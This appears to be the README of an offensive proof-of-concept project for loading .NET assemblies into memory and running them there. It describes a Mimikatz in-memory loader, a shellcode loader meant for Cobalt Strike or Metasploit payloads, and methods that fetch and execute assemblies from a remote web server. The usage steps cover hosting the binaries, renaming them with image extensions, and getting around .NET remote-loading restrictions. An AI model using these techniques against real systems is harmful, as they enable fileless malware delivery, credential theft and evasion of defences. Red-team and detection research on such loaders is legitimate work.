PoC demonstrating some methods for .NET assembly local/remote loading/injection into memory using System.AppDomain.ExecuteAssembly() and System.Reflection.Assembly.LoadFrom() method (check "NetAssembly-Injection/AssemblyLoader.cs" methods documentation).

The following projects are included in the VS2015 solution:

- KatzNetAssembly: A slightly modified version of @Subtee C# PE loader for injecting/running Mimikatz in memory using C#.

- ShellCodeLoader: A shellcode loader pinvoking unmanaged code (virtualalloc, createthread and waitforsingleobject) and injecting/executing shellcode in memory,
				 It can be used for bootstraping and executing coblat strike or msf generated shellcode.

- NetAssembly-Injection: Wraps 2 methods for remote/dynamic loading and execution of .NET assemblies in memory via AppDomain.ExecuteAssembly() and Assembly.LoadFrom().
						 (the third method "Load" was already demonstrated online by @malcomvetter)


Details:

 Method 1:

	* AppDomain can be used to create a sample container/sandbox to execute .NET assemblies within a restricted/sandboxed domain, 
	  it is usually used by developers to restrict access to local/remote resources for security purposes. 
      for instance, it can be used for restricting a third-party developed/used code to access the filesystem or network shares.

	* By default .NET applications are running under the default domain which restricts accessing remote resources, 
	  nonetheless it is possible to create domains with unrestricted permission states (PermissionSet(PermissionState.Unrestricted))
      for loading remote .NET assemblies and executing their main entry point.

	* The AppDomain.ExecuteAssembly("https://remote-host/assembly.exe") method takes a URL representing our hosted .NET assembly,
	  loads it into memory and execute it. (no need to instantiate a specific type or invoke its methods, 
      by default the main entry of the assembly is invoked/executed.)
 
	* Based on MSDN, ExecuteAssembly is leveraging Assembly.LoadFile() (in the background) for assembly loading/execution.

	* Assemblies can be renamed and modified extensions can be used ex: https://remote-host/assembly.png or .js, .txt, .html ..etc.
	  (assembly.exe renamed to assembly.png)

	* More details on:
		https://docs.microsoft.com/en-us/dotnet/api/system.appdomain.executeassembly?redirectedfrom=MSDN&view=netframework-4.7.2#overloads
		https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.loadfile?view=netframework-4.7.2


 Method 2:

	* Loads an assembly from a URL, create an instance based on a type (Class) containing a sepcific method name then invoke the method name.

	* Loading an assembly from a network location is by default now allowed due to default .NET framework CAS policy configuration, 
	 a FileLoadNotFound Exception will be thrown if '<runtime><loadFromRemoteSources enabled = "true" /></runtime>' is not specified in App.config
	 System.Reflection.Assembly.UnsafeLoadFrom() method can be used instead.

	* More detais on: 
	 https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.loadfrom?view=netframework-4.7.2






Example - Usage: 

Example 1:

 Running Mimikatz: Build KatzNetAssembly project, copy the generated "bin/debug/KatzNetAssembly.exe" .NET assembly/binary to a remote web server, then use (NetAssembly-Injection project) Method1() or Method2() to 
 load and execute (in-memory) the remote "KatzNetAssembly.exe" binary.

Example 2:

 Generate x64 Shellcode via cobalt strike or msf, replace the shellcode byte array with your own (in ShellCodeLoader project Program.cs), build the ShellCodeLauncher project, upload 
 the resulted assembly/binary "bin/debug/ShellCodeLoader.exe" to a remote web server, then use (NetAssembly-Injection project) Method1() or Method2() for remote loading/execution.				
